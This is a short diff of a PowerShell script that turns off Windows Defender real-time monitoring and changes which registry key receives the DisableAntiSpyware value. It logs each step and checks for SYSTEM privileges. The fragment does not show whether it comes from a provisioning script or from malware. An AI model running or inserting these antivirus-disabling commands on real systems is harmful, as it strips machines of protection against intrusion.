@@ -14,7 +14,7 @@ LogWrite "Starting script execution"
 
 Set-MpPreference -DisableRealtimeMonitoring $true | Out-Null
 LogWrite "Disabled realtime monitoring"
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force | Out-Null
 LogWrite "Disabled AntiSpyware"
 
 if(-Not $($(whoami) -eq "nt authority\system")) {
